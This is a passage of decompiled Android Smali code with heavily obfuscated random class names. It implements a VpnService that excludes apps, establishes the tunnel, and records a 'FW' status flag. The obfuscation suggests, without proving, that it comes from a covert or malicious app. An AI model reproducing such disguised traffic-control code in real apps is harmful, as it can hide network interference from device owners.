    iget-object p3, p3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v0, p3}, Landroid/net/VpnService$Builder;->addDisallowedApplication(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    move-result-object p3

    sput-object p3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    goto :goto_1

    .line 199
    :cond_4
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    invoke-virtual {p1}, Landroid/net/VpnService$Builder;->establish()Landroid/os/ParcelFileDescriptor;

    move-result-object p1

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->mInterface:Landroid/os/ParcelFileDescriptor;

    if-nez p1, :cond_5

    .line 201
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->stopSelf()V

    return p2

    .line 205
    :cond_5
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->handler:Landroid/os/Handler;

    iget-object p3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->checkVpnStatusRunnable:Ljava/lang/Runnable;

    invoke-virtual {p1, p3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 206
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->FW:Ljava/lang/String;

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "True"

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "!null"

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/String;->getBytes()[B

    move-result-object p3

    invoke-static {p1, p3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->vkxpkmtknpxkyimkulrtdthirulmdzpbuczxqrvzkgbayryngh52(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v2

    .line 209
    :catch_0
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->stopSelf()V

    return p2
.end method

.method public run()V
    .locals 0

    return-void
.end method
